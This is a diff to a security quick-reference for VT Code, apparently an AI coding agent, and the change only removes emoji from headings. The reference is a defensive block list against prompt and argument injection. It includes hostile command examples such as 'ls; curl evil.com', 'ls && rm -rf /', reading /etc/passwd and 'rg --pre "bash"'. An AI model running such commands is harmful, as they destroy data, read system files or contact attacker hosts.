@@ -1,6 +1,6 @@
 # Security Quick Reference
 
-## 🔒 Security at a Glance
+##  Security at a Glance
 
 VT Code implements **5 layers of security** to protect against prompt injection and argument injection attacks.
 
@@ -34,23 +34,23 @@ All other commands are **blocked by default**.
 
 ## Blocked Patterns
 
-### ⤫  Dangerous Commands
+###   Dangerous Commands
 ```bash
 rm, sudo, chmod, docker, curl (without sandbox)
 ```
 
-### ⤫  Execution Flags
+###   Execution Flags
 ```bash
 --pre, --pre-glob, -exec, -e, --command
 ```
 
-### ⤫  Path Traversal
+###   Path Traversal
 ```bash
 ../../../etc/passwd
 /etc/passwd (outside workspace)
 ```
 
-### ⤫  Command Chaining
+###   Command Chaining
 ```bash
 ls; curl evil.com
 ls && rm -rf /
@@ -78,7 +78,7 @@ cat ./src/main.rs
 ls -la ./src
 ```
 
-### ⤫  Blocked Operations
+###   Blocked Operations
 ```bash
 # Preprocessor execution
 rg --pre "bash" pattern .
@@ -121,7 +121,7 @@ If you suspect a security issue:
 - [Complete Security Model](./SECURITY_MODEL.md)
 - [Security Audit](./SECURITY_AUDIT.md)
 - [Security Guide](./guides/security.md)
-- 📋 [Tool Policies](./vtcode_tools_policy.md)
+-  [Tool Policies](./vtcode_tools_policy.md)
 
 ## Security Updates
 
